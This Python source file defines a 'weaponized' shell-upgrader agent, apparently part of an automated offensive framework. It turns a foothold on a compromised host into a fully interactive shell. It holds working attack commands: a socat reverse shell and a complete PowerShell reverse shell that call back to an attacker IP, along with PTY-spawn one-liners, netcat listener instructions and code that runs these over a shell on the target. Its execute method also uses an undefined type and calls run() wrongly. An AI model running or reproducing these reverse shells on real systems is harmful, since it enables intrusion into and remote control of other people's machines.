import asyncio
import hashlib
import os
from typing import Dict, List, Any, Optional
from core.base_agent import BaseAgent
from core.data_models import AgentData, AttackPhase
from core.logger import log


class ShellUpgraderAgent(BaseAgent):
    """
    Weaponized Shell Upgrader Agent - อัพเกรด shell เป็น fully interactive PTY
    
    Features:
    - Multiple upgrade techniques (Python, Script, Socat, Perl, Ruby)
    - Auto-detect OS and shell type
    - TTY size adjustment
    - TERM variable configuration
    - Signal handling (Ctrl+C, Ctrl+Z)
    - Tab completion
    - Arrow keys support
    """
    
    supported_phases = [AttackPhase.POST_EXPLOITATION, AttackPhase.ESCALATION]
    required_tools = []

    def __init__(self, context_manager=None, orchestrator=None, **kwargs):
        super().__init__(context_manager, orchestrator, **kwargs)
        workspace_dir = os.getenv("WORKSPACE_DIR", "workspace"); self.results_dir = os.path.join(workspace_dir, "loot", "shell_upgrade")
        os.makedirs(self.results_dir, exist_ok=True)
        
        # Linux upgrade techniques
        self.linux_techniques = [
            {
                "name": "python3_pty",
                "commands": [
                    'python3 -c \'import pty; pty.spawn("/bin/bash")\'',
                    'export TERM=xterm',
                    'stty raw -echo; fg',
                    'reset',
                    'stty rows 38 columns 116'
                ],
                "description": "Python3 PTY spawn"
            },
            {
                "name": "python_pty",
                "commands": [
                    'python -c \'import pty; pty.spawn("/bin/bash")\'',
                    'export TERM=xterm',
                    'stty raw -echo; fg',
                    'reset',
                    'stty rows 38 columns 116'
                ],
                "description": "Python2 PTY spawn"
            },
            {
                "name": "script_tty",
                "commands": [
                    '/usr/bin/script -qc /bin/bash /dev/null',
                    'export TERM=xterm',
                    'stty raw -echo; fg',
                    'reset',
                    'stty rows 38 columns 116'
                ],
                "description": "Script command TTY"
            },
            {
                "name": "socat",
                "commands": [
                    'socat exec:\'bash -li\',pty,stderr,setsid,sigint,sane tcp:{ATTACKER_IP}:{PORT}'
                ],
                "description": "Socat fully interactive shell",
                "requires_listener": True
            },
            {
                "name": "perl_pty",
                "commands": [
                    'perl -e \'use POSIX qw(setsid); POSIX::setsid(); exec "/bin/bash";\''
                ],
                "description": "Perl PTY spawn"
            },
            {
                "name": "ruby_pty",
                "commands": [
                    'ruby -e \'require "pty"; PTY.spawn("/bin/bash")\''
                ],
                "description": "Ruby PTY spawn"
            },
            {
                "name": "lua_pty",
                "commands": [
                    'lua -e \'os.execute("/bin/bash")\''
                ],
                "description": "Lua shell spawn"
            },
            {
                "name": "expect_pty",
                "commands": [
                    'expect -c \'spawn /bin/bash; interact\''
                ],
                "description": "Expect interactive spawn"
            },
        ]
        
        # Windows upgrade techniques
        self.windows_techniques = [
            {
                "name": "powershell_pty",
                "commands": [
                    'powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("{ATTACKER_IP}",{PORT});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
                ],
                "description": "PowerShell reverse shell",
                "requires_listener": True
            },
        ]

    async def run(self, directive: str, context: Dict[str, Any]) -> AgentData:
        """
        Main execution method
        
        Args:
            directive: "upgrade", "auto", "list"
            context: {
                "shell_id": active shell ID,
                "os": "linux" or "windows" (optional, auto-detect),
                "technique": specific technique name (optional),
                "attacker_ip": for socat/powershell,
                "port": for socat/powershell
            }
        """
        log.info(f"[ShellUpgraderAgent] Starting with directive: {directive}")
        
        shell_id = context.get("shell_id")
        if not shell_id:
            return AgentData(
                agent_name="ShellUpgraderAgent",
                success=False,
                data={"error": "No shell_id provided"}
            )

        try:
            if directive == "list":
                result = self._list_techniques(context)
            elif directive == "upgrade":
                result = await self._upgrade_shell(shell_id, context)
            elif directive == "auto":
                result = await self._auto_upgrade(shell_id, context)
            else:
                result = await self._auto_upgrade(shell_id, context)
            
            return AgentData(
                agent_name="ShellUpgraderAgent",
                success=result.get("success", False),
                data=result
            )
            
        except Exception as e:
            log.error(f"[ShellUpgraderAgent] Error: {e}")
            return AgentData(
                agent_name="ShellUpgraderAgent",
                success=False,
                data={"error": str(e)}
            )

    async def execute(self, strategy: Strategy) -> AgentData:
        """Execute shell upgrader agent weaponized"""
        try:
            target = strategy.context.get('target_url', '')
            
            # Call existing method
            if asyncio.iscoroutinefunction(self.run):
                results = await self.run(target)
            else:
                results = self.run(target)
            
            return AgentData(
                agent_name=self.__class__.__name__,
                success=True,
                summary=f"{self.__class__.__name__} completed successfully",
                errors=[],
                execution_time=0,
                memory_usage=0,
                cpu_usage=0,
                context={'results': results}
            )
        except Exception as e:
            return AgentData(
                agent_name=self.__class__.__name__,
                success=False,
                summary=f"{self.__class__.__name__} failed",
                errors=[str(e)],
                execution_time=0,
                memory_usage=0,
                cpu_usage=0,
                context={}
            )

    def _list_techniques(self, context: Dict) -> Dict:
        """แสดงรายการ upgrade techniques"""
        os_type = context.get("os", "linux")
        
        if os_type == "linux":
            techniques = self.linux_techniques
        elif os_type == "windows":
            techniques = self.windows_techniques
        else:
            techniques = self.linux_techniques + self.windows_techniques
        
        result = {
            "success": True,
            "os": os_type,
            "techniques": [
                {
                    "name": t["name"],
                    "description": t["description"],
                    "requires_listener": t.get("requires_listener", False)
                }
                for t in techniques
            ]
        }
        
        return result

    async def _upgrade_shell(self, shell_id: str, context: Dict) -> Dict:
        """อัพเกรด shell ด้วย technique ที่ระบุ"""
        technique_name = context.get("technique")
        os_type = context.get("os", "linux")
        
        if not technique_name:
            return {"success": False, "error": "No technique specified"}
        
        # Find technique
        if os_type == "linux":
            techniques = self.linux_techniques
        else:
            techniques = self.windows_techniques
        
        technique = None
        for t in techniques:
            if t["name"] == technique_name:
                technique = t
                break
        
        if not technique:
            return {"success": False, "error": f"Technique {technique_name} not found"}
        
        # Prepare commands
        commands = technique["commands"].copy()
        
        # Replace placeholders
        attacker_ip = context.get("attacker_ip", "")
        port = context.get("port", "")
        
        for i, cmd in enumerate(commands):
            cmd = cmd.replace("{ATTACKER_IP}", attacker_ip)
            cmd = cmd.replace("{PORT}", str(port))
            commands[i] = cmd
        
        result = {
            "success": True,
            "technique": technique_name,
            "commands": commands,
            "description": technique["description"],
            "requires_listener": technique.get("requires_listener", False),
            "instructions": self._generate_instructions(technique, attacker_ip, port)
        }
        
        log.success(f"[ShellUpgraderAgent] Generated upgrade commands for {technique_name}")
        return result

    async def _auto_upgrade(self, shell_id: str, context: Dict) -> Dict:
        """อัพเกรดอัตโนมัติ - ลองทุก technique"""
        log.info(f"[ShellUpgraderAgent] Attempting auto upgrade...")
        
        # Detect OS
        os_type = context.get("os")
        if not os_type:
            os_type = await self._detect_os(shell_id)
        
        # Select techniques
        if os_type == "linux":
            techniques = self.linux_techniques
        else:
            techniques = self.windows_techniques
        
        # Try each technique
        successful_techniques = []
        
        for technique in techniques:
            if technique.get("requires_listener"):
                # Skip techniques that require listener
                continue
            
            log.info(f"[ShellUpgraderAgent] Trying {technique['name']}...")
            
            # Test technique
            success = await self._test_technique(shell_id, technique)
            
            if success:
                successful_techniques.append(technique["name"])
                log.success(f"[ShellUpgraderAgent] {technique['name']} worked!")
                break  # Stop after first success
        
        result = {
            "success": len(successful_techniques) > 0,
            "os": os_type,
            "successful_techniques": successful_techniques,
            "total_tested": len(techniques),
            "output_file": self._save_results(shell_id, "auto_upgrade", successful_techniques)
        }
        
        if successful_techniques:
            log.success(f"[ShellUpgraderAgent] Shell upgraded successfully!")
        else:
            log.warning("[ShellUpgraderAgent] No technique worked")
        
        return result

    async def _detect_os(self, shell_id: str) -> str:
        """ตรวจสอบ OS"""
        # Try Linux detection
        output = await self._execute_command(shell_id, "uname -s")
        if "Linux" in output:
            return "linux"
        
        # Try Windows detection
        output = await self._execute_command(shell_id, "ver")
        if "Windows" in output:
            return "windows"
        
        # Default to linux
        return "linux"

    async def _test_technique(self, shell_id: str, technique: Dict) -> bool:
        """ทดสอบ technique"""
        try:
            # Execute first command
            first_cmd = technique["commands"][0]
            output = await self._execute_command(shell_id, first_cmd)
            
            # Check for success indicators
            if technique["name"] == "python3_pty" or technique["name"] == "python_pty":
                # Python PTY usually succeeds if no error
                return "Traceback" not in output and "Error" not in output
            
            elif technique["name"] == "script_tty":
                return "Script started" in output or "script" in output.lower()
            
            else:
                # Generic success check
                return "error" not in output.lower() and "not found" not in output.lower()
            
        except Exception as e:
            log.debug(f"[ShellUpgraderAgent] Technique {technique['name']} failed: {e}")
            return False

    async def _execute_command(self, shell_id: str, command: str) -> str:
        """Execute command on shell"""
        try:
            # Integrate with shell manager if available
            if self.orchestrator and hasattr(self.orchestrator, 'shell_manager'):
                shell_manager = self.orchestrator.shell_manager
                result = await shell_manager.execute_command(shell_id, command)
                return result.get('output', '')
            
            # Fallback: Use context manager to execute
            if self.context_manager:
                shell_context = self.context_manager.get(f"shell_{shell_id}")
                if shell_context and 'connection' in shell_context:
                    # Execute via connection object
                    conn = shell_context['connection']
                    if hasattr(conn, 'exec_command'):
                        stdin, stdout, stderr = conn.exec_command(command)
                        output = stdout.read().decode('utf-8', errors='ignore')
                        error = stderr.read().decode('utf-8', errors='ignore')
                        return output + error
                    elif hasattr(conn, 'send'):
                        # For raw socket connections
                        conn.send(command.encode() + b'\n')
                        import time
                        time.sleep(1)
                        if hasattr(conn, 'recv'):
                            return conn.recv(4096).decode('utf-8', errors='ignore')
            
            log.warning(f"[ShellUpgraderAgent] No shell manager available for shell_id: {shell_id}")
            return ""
        except Exception as e:
            log.error(f"[ShellUpgraderAgent] Command execution error: {e}")
            return ""

    def _generate_instructions(self, technique: Dict, attacker_ip: str, port: str) -> List[str]:
        """สร้างคำแนะนำการใช้งาน"""
        instructions = []
        
        if technique.get("requires_listener"):
            instructions.append(f"1. Start a listener: nc -lvnp {port}")
            instructions.append("2. Execute the command on the target")
            instructions.append("3. You should receive a fully interactive shell")
        else:
            instructions.append("1. Execute the commands in order:")
            for i, cmd in enumerate(technique["commands"], 1):
                instructions.append(f"   {i}. {cmd}")
            instructions.append("2. Press Ctrl+Z after the first command")
            instructions.append("3. Type 'stty raw -echo; fg' in your terminal")
            instructions.append("4. Press Enter twice")
            instructions.append("5. You should now have a fully interactive shell")
        
        return instructions

    def _save_results(self, shell_id: str, operation: str, data: Any) -> str:
        """บันทึกผลลัพธ์"""
        filename = f"shell_upgrade_{operation}_{shell_id}.txt"
        filepath = os.path.join(self.results_dir, filename)
        
        try:
            import json
            with open(filepath, 'w') as f:
                f.write(f"Shell ID: {shell_id}\n")
                f.write(f"Operation: {operation}\n")
                f.write("="*80 + "\n\n")
                f.write(json.dumps(data, indent=2))
            return filepath
        except Exception as e:
            log.error(f"[ShellUpgraderAgent] Failed to save results: {e}")
            return ""

